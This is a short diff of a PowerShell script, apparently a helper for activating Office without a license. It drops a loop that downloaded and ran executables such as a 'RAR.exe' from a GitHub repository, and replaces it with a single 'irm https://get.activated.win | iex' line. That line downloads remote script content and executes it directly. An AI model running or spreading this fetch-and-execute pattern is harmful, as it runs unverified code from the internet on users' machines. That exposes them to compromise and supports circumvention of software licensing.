@@ -58,13 +58,7 @@ $urls = @(
     'https://github.com/Zigsaw07/office2024/raw/main/RAR.exe'
 )
 
-# URL of the remote script to execute
-$remoteScriptUrl = 'https://get.activated.win'
+# PowerShell script to run the irm https://get.activated.win | iex command
 
-# Loop through each URL and execute the download and run function
-foreach ($url in $urls) {
-    DownloadAndRun-Executable -url $url
-}
-
-# Execute the remote script
-Execute-RemoteScript -url $remoteScriptUrl
+# Execute the command to download and run the script from the URL
+irm https://get.activated.win | iex
